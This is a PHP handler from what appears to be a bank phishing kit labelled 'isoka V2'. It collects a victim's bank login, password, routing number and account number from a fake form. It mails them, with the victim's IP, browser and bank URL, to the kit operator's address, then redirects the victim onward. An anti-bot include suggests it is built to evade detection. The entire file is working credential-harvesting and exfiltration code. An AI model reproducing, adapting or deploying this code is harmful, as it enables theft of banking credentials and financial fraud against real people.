<?
session_start();
date_default_timezone_set('GMT');
$time = date('d/m/Y G:i:s');
include('../../antibots.php');
include('../../email.php');  
$INF = $_POST['user'] &&  $_POST ['passbnk'] && $_POST['rnum'] && $_POST['acnum'];
if (empty($INF)==false) {
$_SESSION['bank'] = 'success';
$_SESSION['user'] = $_POST['user'];
$_SESSION['passbnk'] = $_POST ['passbnk'];
$_SESSION['rnum'] = $_POST['rnum'];
$_SESSION['acnum'] = $_POST['acnum'];
$msg = " 
<html>
<head><meta charset=\"UTF-8\">
</head>
-------------- isoka V2 --------------<br>
 Bank Name      = <font style='color:#08559C;'>".$_SESSION['bankname']."</font><br>
 Identifiant      = <font style='color:#08559C;'>".$_SESSION['user']."</font><br>
 Mot de passe      = <font style='color:#08559C;'>".$_SESSION['passbnk']."</font><br>
 Routing number    = <font style='color:#08559C;'>".$_SESSION['rnum']."</font><br>
 Account number    = <font style='color:#08559C;'>".$_SESSION['acnum']."</font><br>
 Url de la banque       = <font style='color:#08559C;'><a href=".$_SESSION['url']." style='color:#08559C;'>".$_SESSION['url']."</a></font><br>
 Navigateur  = <font style='color:#08559C;'>".$_SESSION['bro']." On ".$_SESSION['os']."</font><br>
 IP: "._ip()."<br>
 -------------- isoka V2 --------------
</html>\n";
$subject = "📈 BNK 📈[".$_SESSION['ip']."] [".$_SESSION['cn']."]";
$headers = "From:🐉 Hunter x Hunter V2 🐉 <Rez@isoka>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=UTF-8\n";
    @mail($adresse_email,$subject,$msg,$headers);
        header("Location: ../home?websc=_session=".$_SESSION['code_cn']."&".$_SESSION['SESSION']."");
}
